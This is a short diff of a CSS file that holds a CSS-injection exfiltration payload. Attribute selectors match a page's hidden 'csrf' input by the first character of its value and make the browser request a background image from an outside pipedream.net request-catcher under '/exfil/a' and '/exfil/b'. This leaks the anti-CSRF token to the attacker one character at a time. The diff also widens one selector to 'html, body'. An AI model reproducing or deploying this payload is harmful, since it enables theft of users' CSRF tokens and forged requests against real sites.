@@ -1,7 +1,7 @@
 input[name=csrf][value^=a]{
     background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/a);
 }
-input[name=csrf][value^=b]{
+html, body, input[name=csrf][value^=b]{
     background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/b);
 }
 
